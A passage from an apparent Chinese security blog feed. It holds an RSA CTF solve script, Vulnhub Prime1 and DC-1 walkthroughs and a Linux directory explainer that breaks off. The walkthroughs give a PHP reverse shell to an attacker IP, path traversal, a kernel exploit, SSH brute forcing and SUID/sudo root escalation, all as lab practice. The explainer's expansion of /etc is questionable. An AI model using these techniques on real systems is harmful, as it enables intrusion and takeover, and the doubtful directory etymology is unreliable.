class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">704796792 </span><br><span class="line">752211152 </span><br><span class="line">274704164 </span><br><span class="line">18414022 </span><br><span class="line">368270835 </span><br><span class="line">483295235 </span><br><span class="line">263072905 </span><br><span class="line">459788476 </span><br><span class="line">483295235 </span><br><span class="line">459788476 </span><br><span class="line">663551792 </span><br><span class="line">475206804 </span><br><span class="line">459788476 </span><br><span class="line">428313374 </span><br><span class="line">475206804 </span><br><span class="line">459788476 </span><br><span class="line">425392137 </span><br><span class="line">704796792 </span><br><span class="line">458265677 </span><br><span class="line">341524652 </span><br><span class="line">483295235 </span><br><span class="line">534149509 </span><br><span class="line">425392137 </span><br><span class="line">428313374 </span><br><span class="line">425392137 </span><br><span class="line">341524652 </span><br><span class="line">458265677 </span><br><span class="line">263072905 </span><br><span class="line">483295235 </span><br><span class="line">828509797 </span><br><span class="line">341524652 </span><br><span class="line">425392137 </span><br><span class="line">475206804 </span><br><span class="line">428313374 </span><br><span class="line">483295235 </span><br><span class="line">475206804 </span><br><span class="line">459788476 </span><br><span class="line">306220148 </span><br></pre></td></tr></table></figure><p>不要总是觉得<code>ｃ</code>就是一连串的字符串，也可以是分行的，记住不要分行符删除把<code>ｃ</code>变为一个字符串。<br>应该按行进行解密<br>根据给出的文件应该是:<br><code>ｎ</code>为<code>920139713</code><br><code>e</code>为<code>19</code><br>因此解题脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">n = 920139713</span><br><span class="line">p = 49891</span><br><span class="line">q = 18443</span><br><span class="line">e = 19</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = &quot;&quot;</span><br><span class="line">with open(&#x27;roll.txt&#x27;,&#x27;r&#x27;) as f:</span><br><span class="line">    for c in f.readlines():</span><br><span class="line">        m += long_to_bytes(pow(int(c), d, n))</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Prime1打靶</title>
      <link href="/2025/03/01/Prime1%E6%89%93%E9%9D%B6/"/>
      <url>/2025/03/01/Prime1%E6%89%93%E9%9D%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Prime1-靶机渗透"><a href="#Prime1-靶机渗透" class="headerlink" title="Prime1 靶机渗透"></a>Prime1 靶机渗透</h1><p><a href="https://www.vulnhub.com/entry/prime-1,358/">靶机下载地址</a> :<a href="https://www.vulnhub.com/entry/prime-1,358/">https://www.vulnhub.com/entry/prime-1,358/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>目标机器ip为192.168.171.129</p><p>先快速扫描一下目标ip的端口开放情况,并将结果输出到min-rate文件里</p><p><img src="./image-20250225153823533.png" alt="image-20250225153823533"></p><p>发现22和80端口开放,进一步搜索信息,结果输出到ports文件里</p><p><img src="./image-20250225154127029.png" alt="image-20250225154127029"></p><p>用脚本扫描一下看看有没有漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --script=vuln -p22,80 192.168.171.129 -oN vul</span><br></pre></td></tr></table></figure><p><img src="./image-20250225155527773.png" alt="image-20250225155527773"></p><p>22端口暂时不管,先从80端口下手,打开网页,搜寻信息(让我康康~)</p><p><img src="./image-20250225155117968.png" alt="image-20250225155117968"></p><p>发现只有一张图片,看一下网页源码,发现没什么信息,莫得办法,dirsearch启动!</p><p><img src="./image-20250225155820498.png" alt="image-20250225155820498"></p><p>发现了不少东西,挨个康康</p><p>/dev下为一句话,没什么信息</p><p><img src="./image-20250225160130002.png" alt="image-20250225160130002"></p><p>/wordpress老生常谈了,较低版本的wp里会有好多可利用的漏洞</p><p><img src="./image-20250225160255635.png" alt="image-20250225160255635"></p><p><img src="./image-20250225161203324.png" alt="image-20250225161203324"></p><p>然后信息断了,不知道怎么办了,去网上查了一下发现我们的dirsearch的字典不够大,有一个secret.txt文件没有扫到,网上的方法是用dirb扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.171.129 -X .zip,.txt -o dirbscan</span><br></pre></td></tr></table></figure><p>查看secret.txt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.171.129/secret.txt -o secret</span><br></pre></td></tr></table></figure><p><img src="./image-20250225163508423.png" alt="image-20250225163508423"></p><p>提示说要用wfuzz在php文件里进行模糊参数测试,先在index.php中测试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.171.129/index.php?FUZZ</span><br></pre></td></tr></table></figure><p><img src="./image-20250225163806561.png" alt="image-20250225163806561"></p><p>发现file参数,猜测应该是读取任意文件,我尝试读取shadow文件结果都是提醒<code>你在挖掘错误文件</code>,突然发现在secret文件里有个提示要找location.txt查询得到以下提示</p><p><img src="./image-20250225164408469.png" alt="image-20250225164408469"></p><p>访问<code>http://192.168.171.129/image.php?secrettier360</code> 提示说找到正确参数了</p><p>进行文件包含<code>http://192.168.171.129/image.php?secrettier360=../../../../../etc/passwd</code>发现可以读取文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.171.129/image.php?secrettier360=../../../../etc/passwd | tail -5</span><br></pre></td></tr></table></figure><p>查看可用用户名</p><p><img src="./image-20250225171657764.png" alt="image-20250225171657764"></p><p>文件包含该文件,得到密码</p><p><img src="./image-20250225171128918.png" alt="image-20250225171128918"></p><p>尝试用saket:follow_the_ippsec进行wp登录和ssh连接,发现不行</p><p>也许是其他用户的密码呢?试一下,最终发现可以用victor:follow_the_ippsec进行wp后台登录,登录成功<img src="./image-20250225171739873.png" alt="image-20250225171739873"></p><p>对于进入管理界面的wp的渗透思路有两种</p><p>1.在主题获得中上传自己的shell压缩包</p><p>2.在主题编辑器中找到可写如的php文件,写入反弹shell</p><p>尝试了一下发现思路2可行并成功找到可写文件secret.php</p><p><img src="./image-20250225173901980.png" alt="image-20250225173901980"></p><p>写入php反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.171.128/443 0&amp;&gt;1&#x27;&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>进行监听,成功getshell</p><p><img src="./image-20250225174622733.png" alt="image-20250225174622733"></p><h2 id="用户提权"><a href="#用户提权" class="headerlink" title="用户提权"></a>用户提权</h2><p>whoami查看用户为www-data用户</p><p>sudo -l查看是否有suid权限的命令,发现saket目录下有个enc文件有suid权限<img src="./image-20250225182146388.png" alt="image-20250225182146388"></p><p>去saket家目录下看看有没有有用的信息</p><p><img src="./image-20250225181656944.png" alt="image-20250225181656944"></p><p>在user.txt得到一串密文,执行一下./enc发现要输入密码,将密文输入,没有结果</p><p>没办法只能从内核漏洞下手了,</p><p><img src="./image-20250225182554727.png" alt="image-20250225182554727"></p><p>得到版本号后searchsploit搜寻攻击脚本<img src="./image-20250225182705693.png" alt="image-20250225182705693"></p><p>发现第二个第三个是可以本地提权的,克隆到本地</p><p><img src="./image-20250225182957183.png" alt="image-20250225182957183"></p><p>攻击端开启临时服务器传输文件</p><p><img src="./image-20250225183046529.png" alt="image-20250225183046529"></p><p>靶机端接收文件(提前切换到/tmp路径)</p><p><img src="./image-20250225183145925.png" alt="image-20250225183145925"></p><p>45010.c文件里有编译方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br></pre></td></tr></table></figure><p>然后运行./45010实现提权</p><p><img src="./image-20250225183824148.png" alt="image-20250225183824148"></p><p>完结撒花</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>从网上看了看,还有另一种解法</p><p>具体内容参考<a href="https://www.freebuf.com/articles/web/369140.html">https://www.freebuf.com/articles/web/369140.html</a></p><p>大概思路是找到有suid权限./enc文件的密码</p><h1 id="Prime1提权的另一种方式"><a href="#Prime1提权的另一种方式" class="headerlink" title="Prime1提权的另一种方式"></a>Prime1提权的另一种方式</h1><h2 id="查看用户权限"><a href="#查看用户权限" class="headerlink" title="查看用户权限"></a>查看用户权限</h2><p>可以看到有用户saket不需要密码就能以root权限执行，当执行enc时候可以root权限执行却不要输入密码</p><p><img src="https://image.3001.net/images/20230610/1686362045_6483d7bd53459b0ea4650.png!small?1686362045844" alt="1686362045_6483d7bd53459b0ea4650.png!small?1686362045844"></p><p>移动到/home/saket目录下，首先先查看当前目录下有哪些文件与权限。发现enc是有执行权限的，直接尝试执行需要输入密码。尝试strings能否直接查看enc内容查看不了，尝试file读取enc提示没有读的权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /home/saket</span><br><span class="line">ls -liah</span><br><span class="line">./enc</span><br><span class="line">strings enc         #尝试查看enc的内容</span><br><span class="line">file enc            #尝试直接读取enc</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20230610/1686362063_6483d7cfe24c6dfcd7609.png!small?1686362064794" alt="1686362063_6483d7cfe24c6dfcd7609.png!small?1686362064794"></p><h2 id="翻找文件"><a href="#翻找文件" class="headerlink" title="翻找文件"></a>翻找文件</h2><p>既然提示要输入密码，接下来的思路就是找敏感文件，看看能不能在关键信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find / -name &#x27;*backup*&#x27; 2&gt;dev/null | sort | less</span><br><span class="line"></span><br><span class="line">find                     #查找文件命令</span><br><span class="line">2&gt;dev/null               #将报错文件丢除</span><br><span class="line">sort                     #将结果排序</span><br><span class="line">less                     #分页</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20230610/1686362142_6483d81e01f9d68c690f2.png!small?1686362142719" alt="1686362142_6483d81e01f9d68c690f2.png!small?1686362142719"></p><p>在opt/backup文件夹尝试查看server_database，提示server_database是目录。进入server_database目录下找到backup_pass文件，通过读取文件提示enc的密码是backup_password</p><p><img src="https://image.3001.net/images/20230610/1686362173_6483d83d313124a42e696.png!small?1686362173759" alt="1686362173_6483d83d313124a42e696.png!small?1686362173759"></p><h2 id="输入密码"><a href="#输入密码" class="headerlink" title="输入密码"></a>输入密码</h2><p>再次执行enc文件，将获得的密码输入进去，提示权限不足enc.txt和key.txt无法释放。我丢，一开始我还是完了www-data权限不够，后面大佬点拨没有sudo去执行，加入sudo后终于成功。</p><p>不过出现good为何会如此怪异？txt那两个文件呢？发现执行后在当前目录进行释放了两个txt文件，查看enc.txt文件看到一个base64加密内容，查看key.txt文件提示将ippsec转成md5的hash</p><p><img src="https://image.3001.net/images/20230610/1686362192_6483d850e2911e8418224.png!small?1686362193404" alt="1686362192_6483d850e2911e8418224.png!small?1686362193404"><img src="https://image.3001.net/images/20230610/1686362213_6483d865989cf45cdf3bf.png!small?1686362214126" alt="1686362213_6483d865989cf45cdf3bf.png!small?1686362214126"></p><p><img src="https://image.3001.net/images/20230610/1686362234_6483d87acc5272dcc4454.png!small?1686362235311" alt="1686362234_6483d87acc5272dcc4454.png!small?1686362235311"></p><p>编码加密</p><p>将ippsec不输出结尾的换行符进行md5加密，以空格为分割，打印输出第一个值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo echo -n &#x27;ippsec&#x27; | md5sum | awk -F &#x27; &#x27; &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line"></span><br><span class="line">-n                  #不输出结尾的换行符</span><br><span class="line">md5sum              #md5的加密形式</span><br><span class="line">awk                 #awk是文本处理工具</span><br><span class="line">-F                  #以什么条件进行分割条件,本例子是用空格进行分割</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20230610/1686362254_6483d88eef0b81bd93b31.png!small?1686362255802" alt="1686362254_6483d88eef0b81bd93b31.png!small?1686362255802"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo echo -n &#x27;ippsec&#x27; | md5sum | awk -F &#x27; &#x27; &#x27;&#123;print $1&#125;&#x27; | tr -d &#x27;\n&#x27; | od -A n -t x1 | tr -d &#x27;\n&#x27; | tr -d &#x27; &#x27;</span><br><span class="line"></span><br><span class="line">-n                  #不输出结尾的换行符</span><br><span class="line">md5sum              #md5的加密形式</span><br><span class="line">awk                 #awk是文本处理工具</span><br><span class="line">-F                  #以什么条件进行分割条件,本例子是用空格进行分割</span><br><span class="line">tr                  #可以对来自标准输入的字符进行替换、压缩和删除。</span><br><span class="line">-d                  #删除字符串</span><br><span class="line">最后得到ippsec md5的十六进制数</span><br></pre></td></tr></table></figure><p>gsub(/regexp/,replacement,target可省略)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;&#123;gsub(/ /,&quot;\n&quot;); print&#125;&#x27; Cipher | sort | uniq | wc -l</span><br><span class="line">sudo awk &#x27;&#123;gsub(/ /,&quot;\n&quot;); print&#125;&#x27; Cipher | sort | uniq &gt;CipherTypes</span><br><span class="line"></span><br><span class="line">gsub                     #替换\\中间的内容</span><br><span class="line">CipherTypeRaw            #操作的文件名名称</span><br><span class="line">sort                     #结果排序</span><br><span class="line">uniq                     #结果取唯一值</span><br><span class="line">wc -l                    #统计结果</span><br><span class="line">&gt;CipherTypes             #是将结果输出到文件CipherTypes上 </span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20230610/1686362490_6483d97ad7b2e0fd41e8f.png!small?1686362491430" alt="1686362490_6483d97ad7b2e0fd41e8f.png!small?1686362491430"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 密文 | openssl enc -d -a -加密方法 -K 密匙</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for Cipher in $(cat 加密方法文件);do echo  &#x27;密文&#x27; | openssl enc -d -a -$Cipher -K 秘钥 2&gt;/dev/null ;echo $Cipher;done </span><br><span class="line"></span><br><span class="line">for Cipher in $(cat CipherTypes);do echo -n &#x27;xxxxxxxxxxxx&#x27; | openssl enc -d -a -$Cipher -K xxxxxxxxxxxxx 2&gt;/dev/null ; echo $Cipher;done</span><br></pre></td></tr></table></figure><p>最后得到saket旧密码为tribut_to_ippsec</p><p>远程连接一下</p><h2 id="内网提权"><a href="#内网提权" class="headerlink" title="内网提权"></a>内网提权</h2><h3 id="查看系统详情"><a href="#查看系统详情" class="headerlink" title="查看系统详情"></a>查看系统详情</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20230610/1686362724_6483da642dee11f51e2d8.png!small?1686362724831" alt="1686362724_6483da642dee11f51e2d8.png!small?1686362724831"></p><h3 id="查看用户权限-1"><a href="#查看用户权限-1" class="headerlink" title="查看用户权限"></a>查看用户权限</h3><p>发现可以不需要密码以root权限去执行一个/home/victor/undefeated_victor文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20230610/1686362760_6483da88b709beda37f93.png!small?1686362761234" alt="1686362760_6483da88b709beda37f93.png!small?1686362761234"></p><h3 id="查看定时任务"><a href="#查看定时任务" class="headerlink" title="查看定时任务"></a>查看定时任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat etc/crontab</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20230610/1686362780_6483da9c02b93b5ccbb2e.png!small?1686362780380" alt="1686362780_6483da9c02b93b5ccbb2e.png!small?1686362780380"></p><h3 id="成功提权"><a href="#成功提权" class="headerlink" title="成功提权"></a>成功提权</h3><p>提示/tmp/challenge文件没有找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /home/victor/undefeated_victor</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20230610/1686362818_6483dac20cd258aeb621a.png!small?1686362818907" alt="1686362818_6483dac20cd258aeb621a.png!small?1686362818907"></p><p>来到/tmp目录下查看是否有challenge文件，发现没有challenge文件。于是新建一个challenge文件，在文件中写启用一个新的bash线程命令。对文件challenge赋予执行权限，再利用前面提醒的“不需要密码以root权限去执行一个/home/victor/undefeated_victor文件”再执行文件，就获得了root权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &#x27;#!/bin/bash&#x27; &gt;challenge</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt;challenge</span><br><span class="line">chmod +x challenge</span><br><span class="line">sudo /home/victor/undefeated_victor</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20230610/1686362838_6483dad61f9f31c92aa81.png!small?1686362838680" alt="1686362838_6483dad61f9f31c92aa81.png!small?1686362838680"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1</title>
      <link href="/2025/03/01/DC-1/"/>
      <url>/2025/03/01/DC-1/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>使用 nmap 进行 ip 存活和端口扫描</p><p><img src="./1740376636059.png" alt="1740376636059"></p><p>发现22 80 111 55649端口存活,前两个端口最后考虑因为需要进一步信息收集<br>由于55649端口服务未知,于是从111端口下手<br>从网上搜索rpcbind漏洞,发现这个漏洞只能对目标服务器造成破坏,无法提权<br>没办法,只能从80网页看看有什么有用的,进入网站</p><p><img src="./1740377795776.png" alt="1740377795776"></p><p>dirsearch启动,扫一扫敏感路径</p><p><img src="./1740378522466.png" alt="1740378522466"><br>扫出很多路径但是我看了看都没有我想要的信息</p><p>利用工具查询该网站发现是用了名为Drupal的CMS(内容管理系统)</p><p>使用msf工具查询该漏洞</p><p><img src="./1740378691990.png" alt="1740378691990"></p><p>看看描述,挨个使用那几个sql injection的因为可以连上meterpreter<br>将攻击所需参数填好后进行攻击,成功连上meterpreter</p><p><img src="./1740378975024.png" alt="1740378975024"></p><h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>使用python命令(pty可以开启一个交互式虚拟终端)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>ls后发现flag1.txt很可疑,让我康康</p><p><img src="./1740379255911.png" alt="1740379255911"></p><p>说是一个优秀的CMS要有一个配置文件,搜索drupal配置文件,bing显示是一名为settings.php的文件,文件搜索一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;settings.php&quot;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="./1740379879374.png" alt="1740379879374"></p><p>发现数据库和密码,mysql启动！</p><p>查表时发现可以利用的表users,让我康康!</p><p><img src="./1740380168890.png" alt="1740380168890"></p><p>发现用户名和加密过的密码,由于不知道密码的加密过程,想要破解很难</p><p><img src="./1740380312165.png" alt="1740380312165"></p><p>网上搜了搜发现这类CMS检验用户的过程应该是用户输入密码,然后经过系统加密,再与数据库中的密文进行比对,如果一致就登录成功;也就是说只要我们找到系统加密算法,就可以破解密码进行登录</p><p>网上搜索drupal加密脚本的路径发现在/var/www/scripts/password-hash.sh</p><p>用该脚本进行加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure><p>更改admin密码为<code>$S$DTDaZRqxOHZPRjB4FiKquLOjttpDnKj5O/bD5d0SIiV0aPvKFtyd</code>(123456)</p><p><img src="./1740380928016.png" alt="1740380928016"></p><p>直接登录admin:123456在content里发现flag3</p><p><img src="./1740382137271.png" alt="1740382137271"></p><p>在passwd里发现flag4用户推测是出题人给我们的关键用户,没密码只能爆破</p><p><img src="./PixPin_2025-02-24_15-38-01.png" alt="PixPin_2025-02-24_15-38-01"></p><p>hydra 启动!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.171.143</span><br></pre></td></tr></table></figure><p><img src="./1740383111115.png" alt="1740383111115">爆破出密码orange,su切换用户一下~~</p><p>在flag4家目录下发现flag4.txt提示我们进行suid提权</p><p>使用find查找具有SUID权限的可执行二进制文件,find是常用于提权的命令</p><p><img src="./1740383502676.png" alt="1740383502676"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name index.php -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p>成功提权,切换到/root目录找到最终的flag</p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux目录结构</title>
      <link href="/2025/03/01/Linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/"/>
      <url>/2025/03/01/Linux%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>在 Linux 系统中，每个根目录都有一个简短的名称，这些名称通常来源于它们的功能或用途。理解这些目录名称的全称和含义，可以帮助更好地记忆和理解它们的作用。以下是对常见根目录及其名称的解释：</p><hr><h3 id="1"><a href="#1" class="headerlink" title="1. /"></a><strong>1. <code>/</code></strong></h3><ul><li><strong>全称</strong>：Root Directory</li><li><strong>含义</strong>：根目录是整个文件系统的起点，所有其他目录和文件都从这里开始。</li><li><strong>作用</strong>：作为整个文件系统的顶级目录。</li></ul><hr><h3 id="2-bin"><a href="#2-bin" class="headerlink" title="2. /bin"></a><strong>2. <code>/bin</code></strong></h3><ul><li><strong>全称</strong>：Binary Directory</li><li><strong>含义</strong>：<code>bin</code> 是 “binary” 的缩写，表示二进制文件。</li><li><strong>作用</strong>：存放系统启动和运行时所需的可执行文件（二进制文件），这些文件对所有用户可用。</li></ul><hr><h3 id="3-sbin"><a href="#3-sbin" class="headerlink" title="3. /sbin"></a><strong>3. <code>/sbin</code></strong></h3><ul><li><strong>全称</strong>：System Binary Directory</li><li><strong>含义</strong>：<code>sbin</code> 是 “system binary” 的缩写，表示系统二进制文件。</li><li><strong>作用</strong>：存放系统管理员使用的系统管理命令，通常需要 <code>root</code> 权限才能执行。</li></ul><hr><h3 id="4-etc"><a href="#4-etc" class="headerlink" title="4. /etc"></a><strong>4. <code>/etc</code></strong></h3><ul><li><strong>全称</strong>：Extended System Configuration Directory</li><li><strong>含义</strong>：<code>etc</code> 是 “extended system configuration” 的缩写，表示扩展系统配置。</li><li><strong>作用</strong>：存放系统配置文件，如用户信息、服务配置、网络设置等。</li></ul><hr><h3 id="5-dev"><a href="#5-dev" class="headerlink" title="5. /dev"></a><strong>5. <code>/dev</code></strong></h3><ul><li><strong>全称</strong>：Device Directory</li><li><strong>含义</strong>：<code>dev</code> 是 “device” 的缩写，表示设备。</li><li><strong>作用</strong>：存放设备文件，允许用户和程序通过文件系统访问硬件设备。</li></ul><hr><h3 id="6-proc"><a href="#6-proc" class="headerlink" title="6. /proc"></a><strong>6. <code>/proc</code></strong></h3><ul><li><strong>全称</strong>：Process Directory</li><li><strong>含义</strong>：<code>proc</code> 是 “process” 的缩写，表示进程。</li><li><strong>作用</strong>：虚拟文件系统，存放进程和系统信息，提供实时的系统和进程信息。</li></ul><hr><h3 id="7-var"><a href="#7-var" class="headerlink" title="7. /var"></a><strong>7. <code>/var</code></strong></h3><ul><li><strong>全称</strong>：Variable Directory</li><li><strong>含义</strong>：<code>var</code> 是 “variable” 的缩写，表示可变。</li><li><strong>作用</strong>：存放可变数据，如日志文件、邮件、缓存等，这些数据在系统运行时会动态变化。</li></ul><hr><h3 id="8-tmp"><a href="#8-tmp" class="headerlink" title="8. /tmp"></a><strong>8. <code>/tmp</code></strong></h3><ul><li><strong>全称</strong>：Temporary Directory</li><li><strong>含义</strong>：<code>tmp</code> 是 “temporary” 的缩写，表示临时。</li><li><strong>作用</strong>：存放临时文件，这些文件通常在系统重启时被清除。</li></ul><hr><h3 id="9-usr"><a href="#9-usr" class="headerlink" title="9. /usr"></a><strong>9. <code>/usr</code></strong></h3><ul><li><strong>全称</strong>：Unix System Resources Directory</li><li><strong>含义</strong>：<code>usr</code> 是 “Unix system resources” 的缩写，表示 Unix 系统资源。</li><li><strong>作用</strong>：存放用户程序和文件，如可执行文件、库文件、文档等。</li></ul><hr><h3 id="10-home"><a href="#10-home" class="headerlink" title="10. /home"></a><strong>10. <code>/home</code></strong></h3><ul><li><strong>全称</strong>：Home Directory</li><li><strong>含义</strong>：<code>home</code> 是 “home” 的缩写，表示家目录。</li><li><strong>作用</strong>：存放普通用户的个人文件，每个用户有一个独立的目录。</li></ul><hr><h3 id="11-root"><a href="#11-root" class="headerlink" title="11. /root"></a><strong>11. <code>/root</code></strong></h3><ul><li><strong>全称</strong>：Root User’s Home Directory</li><li><strong>含义</strong>：<code>root</code> 是 <code>root</code> 用户的家目录。</li><li><strong>作用</strong>：存放 <code>root</code> 用户的个人文件和配置。</li></ul><hr><h3 id="12-boot"><a href="#12-boot" class="headerlink" title="12. /boot"></a><strong>12. <code>/boot</code></strong></h3><ul><li><strong>全称</strong>：Boot Directory</li><li><strong>含义</strong>：<code>boot</code> 是 “boot” 的缩写，表示启动。</li><li><strong>作用</strong>：存放启动时需要的文件，如内核文件、初始 RAM 磁盘等。</li></ul><hr><h3 id="13-opt"><a href="#13-opt" class="headerlink" title="13. /opt"></a><strong>13. <code>/opt</code></strong></h3><ul><li><strong>全称</strong>：Optional Directory</li><li><strong>含义</strong>：<code>opt</code> 是 “optional” 的缩写，表示可选。</li><li><strong>作用</strong>：存放可选的软件包，通常用于第三方软件或附加软件包。</li></ul><hr><h3 id="14-media"><a href="#14-media" class="headerlink" title="14. /media"></a><strong>14. <code>/media</code></strong></h3><ul><li><strong>全称</strong>：Media Directory</li><li><strong>含义</strong>：<code>media</code> 是 “media” 的缩写，表示媒体。</li><li><strong>作用</strong>：用于挂载外部存储设备，如 CD-ROM、USB 驱动器等。</li></ul><hr><h3 id="15-mnt"><a href="#15-mnt" class="headerlink" title="15. /mnt"></a><strong>15. <code>/mnt</code></strong></h3><ul><li><strong>全称</strong>：Mount Directory</li><li><strong>含义</strong>：<code>mnt</code> 是 “mount” 的缩写，表示挂载。</li><li><strong>作用</strong>：用于挂载外部存储设备，通常用于临时挂载点。</li></ul><hr><h3 id="16-srv"><a href="#16-srv" class="headerlink" title="16. /srv"></a><strong>16. 